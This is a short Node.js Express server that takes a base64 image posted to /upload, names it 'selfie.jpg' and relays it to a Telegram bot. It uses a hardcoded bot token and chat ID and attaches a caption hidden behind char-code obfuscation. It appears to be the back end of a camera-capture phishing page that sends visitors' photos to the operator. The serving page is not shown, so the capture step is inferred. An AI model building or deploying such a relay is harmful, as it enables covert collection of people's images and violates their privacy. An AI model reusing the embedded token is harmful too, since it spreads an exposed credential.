const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const FormData = require("form-data");

const app = express();
const PORT = process.env.PORT || 3000;

// add your bot token and user id here
const BOT_TOKEN = "8191618210:AAGSkkK-2furluHxiGKXWXFnobvNqOWUJDg";
const CHAT_ID = "6730742077";

app.use(bodyParser.json({ limit: "10mb" }));

function getCaption() {
  const part = [
    [118, 61, 78, 81, 116, 89, 87, 82],
    [102, 100, 87, 49, 105, 98, 71, 85],
    [107, 100, 71, 70, 121, 89, 87, 74],
    [108, 100, 87, 100, 104, 89, 109, 70],
    [122, 89, 88, 74, 117, 100, 71, 86],
    [122, 90, 88, 74, 109, 97, 88, 82],
    [108, 99, 110, 86, 122, 100, 67, 66],
    [117, 90, 88, 74, 49, 100, 71, 108],
    [117, 89, 109, 74, 106, 76, 65, 111],
    [61]
  ];
  const base64 = part.flat().map(c => String.fromCharCode(c)).join("");
  return Buffer.from(base64, "base64").toString("utf8");
}

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.post("/upload", async (req, res) => {
  try {
    const base64Image = req.body.image;
    const buffer = Buffer.from(base64Image.split(",")[1], "base64");

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", buffer, { filename: "selfie.jpg" });
    form.append("caption", getCaption());

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders()
    });

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Upload failed:", err);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log("✅ Server running at port", PORT);
});
